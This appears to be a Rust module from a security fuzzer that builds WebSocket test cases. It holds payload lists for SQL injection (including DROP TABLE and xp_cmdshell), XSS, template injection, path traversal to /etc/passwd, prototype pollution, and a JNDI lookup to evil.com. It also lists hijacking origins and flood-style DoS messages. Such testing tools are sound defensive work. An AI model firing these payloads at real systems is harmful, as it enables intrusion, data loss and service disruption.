#![allow(clippy::vec_init_then_push)]

use crate::fuzzer::payloads::{Payload, PayloadType, Severity};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum WebSocketVulnerability {
    Injection,
    DoS,
    CrossSiteWebSocketHijacking,
    OriginBypass,
    MessageFuzzing,
    FrameFuzzing,
    AuthBypass,
}

impl std::fmt::Display for WebSocketVulnerability {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            WebSocketVulnerability::Injection => write!(f, "WebSocket Injection"),
            WebSocketVulnerability::DoS => write!(f, "WebSocket DoS"),
            WebSocketVulnerability::CrossSiteWebSocketHijacking => write!(f, "CSWSH"),
            WebSocketVulnerability::OriginBypass => write!(f, "Origin Bypass"),
            WebSocketVulnerability::MessageFuzzing => write!(f, "Message Fuzzing"),
            WebSocketVulnerability::FrameFuzzing => write!(f, "Frame Fuzzing"),
            WebSocketVulnerability::AuthBypass => write!(f, "Authentication Bypass"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebSocketTestResult {
    pub vulnerability: WebSocketVulnerability,
    pub success: bool,
    pub message: String,
    pub response_snippet: String,
    pub severity: Severity,
    pub description: String,
}

pub struct WebSocketFuzzer {
    #[allow(dead_code)]
    pub(crate) url: String,
    subprotocols: Vec<String>,
}

impl WebSocketFuzzer {
    pub fn new(url: String) -> Self {
        Self {
            url,
            subprotocols: vec![],
        }
    }

    pub fn with_subprotocols(mut self, protocols: Vec<String>) -> Self {
        self.subprotocols = protocols;
        self
    }

    pub fn generate_subprotocol_tests(&self) -> Vec<WebSocketTestResult> {
        let mut results = Vec::new();

        if self.subprotocols.is_empty() {
            return results;
        }

        let common_subprotocols = vec![
            ("graphql-ws", "GraphQL WebSocket protocol"),
            ("soap", "SOAP over WebSocket"),
            ("mqtt", "MQTT over WebSocket"),
            ("wamp", "WAMP protocol"),
        ];

        for (proto, desc) in common_subprotocols {
            let is_configured = self
                .subprotocols
                .iter()
                .any(|s| s.eq_ignore_ascii_case(proto) || s.contains(proto));

            results.push(WebSocketTestResult {
                vulnerability: WebSocketVulnerability::AuthBypass,
                success: is_configured,
                message: format!("Protocol: {}", proto),
                response_snippet: if is_configured {
                    "Subprotocol accepted - verify auth handling".to_string()
                } else {
                    String::new()
                },
                severity: Severity::Medium,
                description: format!("Subprotocol test: {} - {}", proto, desc),
            });
        }

        for subprotocol in &self.subprotocols {
            results.push(WebSocketTestResult {
                vulnerability: WebSocketVulnerability::AuthBypass,
                success: true,
                message: format!("Configured subprotocol: {}", subprotocol),
                response_snippet: format!("Testing {} subprotocol", subprotocol),
                severity: Severity::Info,
                description: format!("Configured subprotocol validation: {}", subprotocol),
            });
        }

        results
    }

    pub fn generate_all_tests(&self) -> Vec<WebSocketTestResult> {
        let mut results = Vec::new();
        results.extend(self.generate_injection_tests());
        results.extend(self.generate_dos_tests());
        results.extend(self.generate_cswsh_tests());
        results.extend(self.generate_message_fuzz_tests());
        results.extend(self.generate_frame_fuzz_tests());
        results.extend(self.generate_subprotocol_tests());
        results
    }

    pub fn generate_injection_tests(&self) -> Vec<WebSocketTestResult> {
        let mut results = Vec::new();

        let injection_payloads = vec![
            ("'; DROP TABLE users--", "SQL injection attempt"),
            ("<script>alert(1)</script>", "XSS attempt"),
            ("{{7*7}}", "Template injection"),
            ("${jndi:ldap://evil.com/a}", "JNDI injection"),
            ("../../../../etc/passwd", "Path traversal"),
            ("{\"__proto__\":{\"isAdmin\":true}}", "Prototype pollution"),
            ("'; exec xp_cmdshell('id')--", "MSSQL injection"),
            ("1' OR '1'='1", "SQLi bypass attempt"),
        ];

        for (payload, desc) in injection_payloads {
            results.push(WebSocketTestResult {
                vulnerability: WebSocketVulnerability::Injection,
                success: false,
                message: payload.to_string(),
                response_snippet: String::new(),
                severity: Severity::Critical,
                description: format!("Injection test: {}", desc),
            });
        }

        results
    }

    pub fn generate_dos_tests(&self) -> Vec<WebSocketTestResult> {
        let mut results = Vec::new();

        let dos_payloads = vec![
            ("Ping", vec![0u8; 65536], "Large ping frame"),
            (
                "Text",
                "a".repeat(100000).into_bytes(),
                "Large text message",
            ),
            ("Binary", vec![0u8; 100000], "Large binary frame"),
            ("Close", vec![], "Rapid close frames"),
            ("Ping", vec![], "Rapid ping flood"),
            ("Text", "ping".repeat(10000).into_bytes(), "Message flood"),
        ];

        for (opcode, payload, desc) in dos_payloads {
            results.push(WebSocketTestResult {
                vulnerability: WebSocketVulnerability::DoS,
                success: false,
                message: format!("{}: {:?}", opcode, &payload[..payload.len().min(100)]),
                response_snippet: String::new(),
                severity: Severity::Medium,
                description: format!("DoS test: {}", desc),
            });
        }

        results
    }

    pub fn generate_cswsh_tests(&self) -> Vec<WebSocketTestResult> {
        let mut results = Vec::new();

        let malicious_origins = vec![
            "https://evil.com",
            "http://localhost",
            "null",
            "https://target.com.evil.com",
        ];

        for origin in malicious_origins {
            results.push(WebSocketTestResult {
                vulnerability: WebSocketVulnerability::CrossSiteWebSocketHijacking,
                success: false,
                message: format!("Origin: {}", origin),
                response_snippet: String::new(),
                severity: Severity::High,
                description: "Testing Cross-Site WebSocket Hijacking".to_string(),
            });
        }

        results
    }

    pub fn generate_message_fuzz_tests(&self) -> Vec<WebSocketTestResult> {
        let mut results = Vec::new();

        let fuzz_cases = vec![
            ("", "Empty message"),
            ("null", "Null value"),
            ("undefined", "Undefined"),
            ("true", "Boolean true"),
            ("false", "Boolean false"),
            ("{}", "Empty object"),
            ("[]", "Empty array"),
            ("[{}]", "Array with object"),
            ("{\"a\":\"b\",\"c\":\"d\"}", "Nested JSON"),
            ("\u{0000}\u{0000}\u{0000}", "Null bytes"),
            ("\u{0001}\u{0002}\u{0003}", "Control chars"),
            ("\\u0000", "Escaped null"),
            ("%00", "URL encoded null"),
            ("<json>", "Invalid JSON"),
            ("{{{\"a\":1}}", "Template-like"),
            ("' OR 1=1--", "SQLi in JSON"),
        ];

        for (payload, desc) in fuzz_cases {
            results.push(WebSocketTestResult {
                vulnerability: WebSocketVulnerability::MessageFuzzing,
                success: false,
                message: payload.to_string(),
                response_snippet: String::new(),
                severity: Severity::Medium,
                description: format!("Fuzz test: {}", desc),
            });
        }

        results
    }

    pub fn generate_frame_fuzz_tests(&self) -> Vec<WebSocketTestResult> {
        let mut results = Vec::new();

        let frame_tests = vec![
            (0x00, vec![], "Continuation frame"),
            (0x01, b"test".to_vec(), "Text frame with FIN=0"),
            (0x02, b"test".to_vec(), "Binary frame with FIN=0"),
            (0x08, vec![0x03, 0xe8], "Close with status code"),
            (0x09, b"test".to_vec(), "Ping with payload"),
            (0x0a, b"test".to_vec(), "Pong with payload"),
            (0x00, b"\x00\x00\x00".to_vec(), "Fragmented with nulls"),
        ];

        for (opcode, payload, desc) in frame_tests {
            results.push(WebSocketTestResult {
                vulnerability: WebSocketVulnerability::FrameFuzzing,
                success: false,
                message: format!("Opcode: 0x{:02x}, Payload: {:?}", opcode, payload),
                response_snippet: String::new(),
                severity: Severity::Low,
                description: format!("Frame fuzz: {}", desc),
            });
        }

        results
    }
}

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    // Injection payloads
    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "'; DROP TABLE users--".to_string(),
        description: "WebSocket SQL injection".to_string(),
        severity: Severity::Critical,
        tags: vec!["websocket".to_string(), "injection".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "<script>alert(1)</script>".to_string(),
        description: "WebSocket XSS attempt".to_string(),
        severity: Severity::High,
        tags: vec!["websocket".to_string(), "xss".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "{{7*7}}".to_string(),
        description: "Template injection via WebSocket".to_string(),
        severity: Severity::High,
        tags: vec!["websocket".to_string(), "ssti".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "${jndi:ldap://evil.com/a}".to_string(),
        description: "JNDI injection via WebSocket".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "websocket".to_string(),
            "injection".to_string(),
            "jndi".to_string(),
        ],
    });

    // DoS payloads
    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "a".repeat(100000),
        description: "Large text message DoS".to_string(),
        severity: Severity::Medium,
        tags: vec!["websocket".to_string(), "dos".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "ping".repeat(10000),
        description: "WebSocket message flood".to_string(),
        severity: Severity::Medium,
        tags: vec!["websocket".to_string(), "dos".to_string()],
    });

    // CSWSH payloads
    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "https://evil.com".to_string(),
        description: "Cross-Site WebSocket Hijacking origin".to_string(),
        severity: Severity::High,
        tags: vec!["websocket".to_string(), "cswsh".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "null".to_string(),
        description: "Null origin WebSocket hijacking".to_string(),
        severity: Severity::High,
        tags: vec!["websocket".to_string(), "cswsh".to_string()],
    });

    // Message fuzzing payloads
    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "\u{0000}\u{0000}\u{0000}".to_string(),
        description: "Null bytes in WebSocket message".to_string(),
        severity: Severity::Medium,
        tags: vec!["websocket".to_string(), "fuzzing".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "\u{0001}\u{0002}\u{0003}".to_string(),
        description: "Control characters in WebSocket message".to_string(),
        severity: Severity::Low,
        tags: vec!["websocket".to_string(), "fuzzing".to_string()],
    });

    // Frame fuzzing payloads
    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "0x00:continuation".to_string(),
        description: "Invalid continuation frame".to_string(),
        severity: Severity::Low,
        tags: vec!["websocket".to_string(), "frame-fuzz".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "0x08:close:0x03e8".to_string(),
        description: "Close frame with status code".to_string(),
        severity: Severity::Info,
        tags: vec!["websocket".to_string(), "frame-fuzz".to_string()],
    });

    // Subprotocol payloads
    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "graphql-ws".to_string(),
        description: "GraphQL WebSocket subprotocol test".to_string(),
        severity: Severity::Medium,
        tags: vec!["websocket".to_string(), "subprotocol".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Websocket,
        payload: "mqtt".to_string(),
        description: "MQTT over WebSocket subprotocol test".to_string(),
        severity: Severity::Medium,
        tags: vec!["websocket".to_string(), "subprotocol".to_string()],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_payloads_returns_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_payloads_count_reasonable() {
        let payloads = get_payloads();
        assert!(payloads.len() > 0);
        assert!(payloads.len() < 10000);
    }

    #[test]
    fn test_payloads_are_non_empty_strings() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(
                !p.payload.is_empty(),
                "Payload is empty: {:?}",
                p.description
            );
        }
    }

    #[test]
    fn test_payloads_contain_expected_patterns() {
        let payloads = get_payloads();
        let has_sqli = payloads.iter().any(|p| p.payload.contains("DROP TABLE"));
        let has_xss = payloads.iter().any(|p| p.payload.contains("<script>"));
        let has_template = payloads.iter().any(|p| p.payload.contains("{{7*7}}"));
        let has_jndi = payloads.iter().any(|p| p.payload.contains("jndi:"));
        let has_dos = payloads.iter().any(|p| p.tags.iter().any(|t| t == "dos"));
        let has_cswsh = payloads.iter().any(|p| p.tags.iter().any(|t| t == "cswsh"));
        let has_fuzzing = payloads
            .iter()
            .any(|p| p.tags.iter().any(|t| t == "fuzzing"));
        let has_subprotocol = payloads
            .iter()
            .any(|p| p.tags.iter().any(|t| t == "subprotocol"));
        assert!(has_sqli, "Missing SQL injection payload");
        assert!(has_xss, "Missing XSS payload");
        assert!(has_template, "Missing template injection payload");
        assert!(has_jndi, "Missing JNDI injection payload");
        assert!(has_dos, "Missing DoS payload");
        assert!(has_cswsh, "Missing CSWSH payload");
        assert!(has_fuzzing, "Missing fuzzing payload");
        assert!(has_subprotocol, "Missing subprotocol payload");
    }

    #[test]
    fn test_subprotocol_tests_generation() {
        let fuzzer = WebSocketFuzzer::new("wss://example.com/ws".to_string())
            .with_subprotocols(vec!["graphql-ws".to_string(), "soap".to_string()]);

        let tests = fuzzer.generate_subprotocol_tests();
        assert!(!tests.is_empty());
        assert!(tests.iter().any(|t| t.message.contains("graphql-ws")));
        assert!(tests.iter().any(|t| t.message.contains("soap")));
    }

    #[test]
    fn test_subprotocol_tests_empty_when_no_protocols() {
        let fuzzer = WebSocketFuzzer::new("wss://example.com/ws".to_string());
        let tests = fuzzer.generate_subprotocol_tests();
        assert!(tests.is_empty());
    }

    #[test]
    fn test_all_tests_includes_subprotocol() {
        let fuzzer = WebSocketFuzzer::new("wss://example.com/ws".to_string())
            .with_subprotocols(vec!["graphql-ws".to_string()]);

        let tests = fuzzer.generate_all_tests();
        assert!(tests
            .iter()
            .any(|t| t.vulnerability == WebSocketVulnerability::AuthBypass));
    }
}
